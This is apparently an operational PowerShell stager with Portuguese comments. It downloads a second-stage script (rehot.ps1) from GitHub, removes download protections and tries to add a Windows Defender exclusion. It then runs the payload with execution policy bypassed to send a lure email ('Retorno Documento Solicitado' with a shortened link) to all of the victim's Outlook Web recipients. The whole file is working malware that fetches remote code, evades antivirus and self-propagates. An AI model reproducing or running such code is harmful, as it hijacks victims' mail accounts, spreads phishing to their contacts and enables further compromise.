# reho.ps1 v3 - runner resiliente (ASCII-only, PS 5.1+)
# Baixa o rehot.ps1 ATUAL do GitHub (2 engines), remove bloquios e executa a campanha.
# Diagnostico por estagio: linhas [reho ...]; FALHA sai o motivo + exit code do estagio.
# Nao carrega parametros de campanha aqui: qualquer ajuste da campanha
# e feito em rehot.ps1 (re-up) - este runner nunca muda.

$ErrorActionPreference = 'Stop'
$urls = @(
    'https://raw.githubusercontent.com/SagazBeiramar/stl/refs/heads/main/rehot.ps1',
    'https://github.com/SagazBeiramar/stl/raw/refs/heads/main/rehot.ps1'
)
$d = Join-Path $env:LOCALAPPDATA 'rehot'
$t = Join-Path $d 'rehot.ps1'

function RhoFail([int]$stage, [string]$msg) {
    Write-Output ('[reho FALHA estagio-' + $stage + '] ' + $msg)
    exit $stage
}

if (-not (Test-Path $d)) {
    try {
        New-Item -ItemType Directory -Force -Path $d | Out-Null
    } catch {
        RhoFail 1 ('pasta nao criada: ' + $_.Exception.Message)
    }
}
if (Test-Path $t) { Remove-Item $t -Force -ErrorAction SilentlyContinue }

$ok = $false
foreach ($u in $urls) {
    if ($ok) { break }
    foreach ($engine in @('iwr', 'curl')) {
        try {
            if ($engine -eq 'iwr') {
                Invoke-WebRequest $u -OutFile $t -UseBasicParsing -TimeoutSec 60
            } else {
                $tmp = $t + '.dl'
                & curl.exe -sSL -f --connect-timeout 30 -o $tmp $u 2>$null
                if (-not (Test-Path $tmp)) { throw 'curl.exe sem output' }
                Move-Item $tmp $t -Force
            }
            if ((Test-Path $t) -and ((Get-Item $t).Length -gt 20000)) {
                if ((Get-Content $t -Raw).Contains('Send-OWAMsg')) { $ok = $true }
            }
        } catch { }
    }
}
if (-not $ok) { RhoFail 2 'download do rehot.ps1 nao completou (404/403/rede/bloqueio) nos 2 engines' }
Write-Output ('[reho] ok estagio-2 download (' + (Get-Item $t).Length + ' bytes)')

try { Unblock-File $t -ErrorAction SilentlyContinue } catch { }
try { Add-MpPreference -ExclusionPath $d -ErrorAction SilentlyContinue } catch { }
Write-Output '[reho] ok estagio-3 unblock (exclusao do Defender so aplica em shell admin; sem admin segue sem ela)'

$argvs = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $t,
           '-CloseBrowsers', '-ToAllRecipients',
           '-Subject', 'Retorno Documento Solicitado',
           '-Body', 'Conforme solicitado aqui esta o documento que voce me pediu https://encurtador.com.br/YYaR')
try {
    & (Join-Path $PSHOME 'powershell.exe') @argvs
    exit $LASTEXITCODE
} catch {
    RhoFail 4 ('execucao falhou: ' + $_.Exception.Message)
}
